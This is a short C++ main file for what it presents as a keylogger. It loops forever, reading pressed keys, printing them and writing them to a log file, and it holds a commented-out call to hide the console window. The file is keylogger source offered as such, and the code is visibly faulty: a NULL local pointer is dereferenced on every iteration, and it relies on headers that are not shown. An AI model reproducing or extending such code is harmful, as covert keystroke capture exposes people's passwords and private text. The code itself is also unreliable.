#include "logManager.h"
#include "keyLogger.h"
#include "windowManager.h"

#define ITERATION_DELAY 120

logManager* logManager::manager = NULL;

int main()
{
    keyStroke key;

    logManager* manager = NULL;

    //windowManager::hideConsoleWindow();

    // Mainloop that logs the keystrokes.
    while(TRUE)
    {
        key = keyLogger::checkPressedKey();
        std::cout << key.getKeyCharacter();
        manager->writeCharToLog(key.getKeyCharacter());
        Sleep(ITERATION_DELAY); 
    }
	return 0;
}